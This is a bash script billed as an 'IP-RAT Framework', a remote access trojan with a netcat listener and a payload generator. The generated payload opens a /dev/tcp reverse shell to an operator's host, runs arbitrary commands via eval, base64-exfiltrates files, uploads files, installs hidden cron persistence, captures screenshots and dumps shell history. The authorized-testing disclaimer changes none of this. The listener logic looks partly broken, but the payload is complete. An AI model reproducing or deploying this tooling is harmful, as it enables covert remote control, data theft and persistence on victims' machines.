#!/usr/bin/env bash
# ============================================================
#  IP-RAT Framework v1.0
#  Coded by: Sabaz Ali Khan (Cyber Security Engineer)
#  For authorized penetration testing engagements only
# ============================================================

VERSION="1.0"
AUTHOR="Sabaz Ali Khan"
LISTEN_PORT=4444
SESSIONS_DIR="/tmp/.iprat_sessions"
LOG_DIR="/tmp/.iprat_logs"
mkdir -p "$SESSIONS_DIR" "$LOG_DIR"

BANNER='
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣋⠟⠪⣝⠻⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡀⢀⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣛⡿⢝⣫⠫⣧⠫⡠⡌⣊⠟⣌⢳⢭⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⢻⣿⣿⠯⣟⣦⠳⣜⢫⡞⣩⣜⣏⡷⢼⣷⣛⢭⣊⣧⣏⡳⣜⡭⡷⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢠⢨⡈⠛⠟⠀⠈⠳⣯⢜⡳⢬⡹⠼⢯⣝⣿⣿⣌⣂⡡⢛⣎⡝⢮⣽⣳⠽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣄⣇⢄⠀⠀⠀⠀⠀⡟⡸⢄⠻⡟⣧⢼⣿⣇⡇⢧⢤⣇⢟⡼⣜⣸⠿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⡞⣷⣄⠀⢣⡀⠀⣍⠵⣉⡲⣱⢞⣿⡽⣷⠯⢳⣟⣶⣺⠷⢊⡏⢾⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
              I P - R A T   F R A M E W O R K
'

show_banner() {
    echo -e "\033[1;31m$BANNER\033[0m"
    echo -e "\033[1;37m ============================================================\033[0m"
    echo -e "\033[1;32m   IP-RAT Framework v$VERSION  |  Coded by $AUTHOR\033[0m"
    echo -e "\033[1;32m   Cyber Security Engineer — Ethical Testing Tool\033[0m"
    echo -e "\033[1;37m ============================================================\033[0m"
    echo ""
}

show_help() {
    cat <<EOF
Usage:
  ${0} listen [PORT]        Start the C2 listener (default port $LISTEN_PORT)
  ${0} payload [IP] [PORT]  Generate the reverse-shell payload
  ${0} help                 Show this help

Commands available inside a session:
  shell <cmd>   Run arbitrary command on target
  sysinfo       Grab OS / user / IP info
  download <f>  Exfil a file to $LOG_DIR
  upload <f>    Push a file to target /tmp
  persist       Install persistence (cron)
  screenshot    Capture screen (gnome-screenshot on target)
  keylog        Dump shell history as pseudo-keylog
  procs         Process list
  kill          Kill session on target
  exit          Detach from session
EOF
}

# ---------- Payload generator ----------
gen_payload() {
    local ip="${1:-127.0.0.1}" port="${2:-$LISTEN_PORT}"
    local out="iprat_payload.sh"
    cat > "$out" <<EOF
#!/usr/bin/env bash
# IP-RAT Payload — coded by Sabaz Ali Khan
SRV=${ip}; PORT=${port}
while true; do
  exec 3<>/dev/tcp/\$SRV/\$PORT || { sleep 30; continue; }
  while IFS= read -r cmd <&3; do
    case "\$cmd" in
      exit) exec 3>&-; break 2 ;;
      sysinfo)
        echo "===SYSINFO===" >&3
        uname -a >&3; id >&3; hostname >&3
        ip -4 addr show 2>/dev/null | grep inet >&3
        echo "===END===" >&3 ;;
      download)
        read -r f <&3; base64 "\$f" 2>/dev/null >&3; echo "__EOF_B64__" >&3 ;;
      upload)
        read -r f <&3
        b64d=""; while IFS= read -r line <&3; do [ "\$line" = "__EOF_B64__" ] && break; b64d="\$b64d\$line"; done
        echo "\$b64d" | base64 -d > "/tmp/\$(basename \$f)" 2>/dev/null ;;
      persist)
        cron_line="*/5 * * * * bash /tmp/.iprat_p.sh"
        cp "\$0" /tmp/.iprat_p.sh
        (crontab -l 2>/dev/null; echo "\$cron_line") | crontab - 2>/dev/null
        echo "[*] persistence installed" >&3 ;;
      screenshot)
        gnome-screenshot -f /tmp/.scr.png 2>/dev/null || import -window root /tmp/.scr.png 2>/dev/null
        base64 /tmp/.scr.png 2>/dev/null >&3; echo "__EOF_B64__" >&3 ;;
      keylog)
        cat ~/.bash_history 2>/dev/null >&3 ;;
      procs)
        ps aux >&3 ;;
      kill)
        (crontab -l 2>/dev/null | grep -v iprat_p) | crontab - 2>/dev/null
        rm -f /tmp/.iprat_p.sh; echo "[*] dead" >&3; exec 3>&-; break 2 ;;
      *)
        eval "\$cmd" 2>&1 >&3 ;;
    esac
  done
  exec 3>&-
  sleep 30
done
EOF
    chmod +x "$out"
    echo "[+] Payload written: $out  (target: ${ip}:${port})"
    echo "[+] Deploy: scp/bundle it, or one-liner:"
    echo "    bash -c \"\$(cat $out)\""
}

# ---------- Listener ----------
start_listener() {
    local port="${1:-$LISTEN_PORT}"
    trap 'pkill -P $$ 2>/dev/null; echo; echo "[*] Listener stopped."; exit 0' INT
    echo "[*] IP-RAT listener on 0.0.0.0:$port — waiting for beacons..."
    local sid=0
    while true; do
        ( nc -lvp "$port" ) > "$SESSIONS_DIR/$sid.raw" 2> "$SESSIONS_DIR/$sid.meta" &
        local pid=$!
        echo "[+] New connection attempt -> session $sid (pid $pid)"
        ( sleep 2; kill "$pid" 2>/dev/null )   # grab banner-less beacon, then re-arm
        wait "$pid" 2>/dev/null
        echo "[*] Session $sid closed. Log: $SESSIONS_DIR/$sid.raw"
        sid=$((sid+1))
    done
}

# ---------- Session operator ----------
operate_session() {
    local raw="$1"
    local cmd
    while true; do
        echo -ne "\033[1;31m(ip-rat)>\033[0m "
        read -r cmd
        case "$cmd" in
            exit) break ;;
            "") continue ;;
            *) echo "$cmd" >> "$raw" ;;
        esac
    done
}

# ---------- Main ----------
show_banner
case "${1:-help}" in
    listen)  start_listener "${2:-$LISTEN_PORT}" ;;
    payload) gen_payload "${2:-127.0.0.1}" "${3:-$LISTEN_PORT}" ;;
    help|*)  show_help ;;
esac
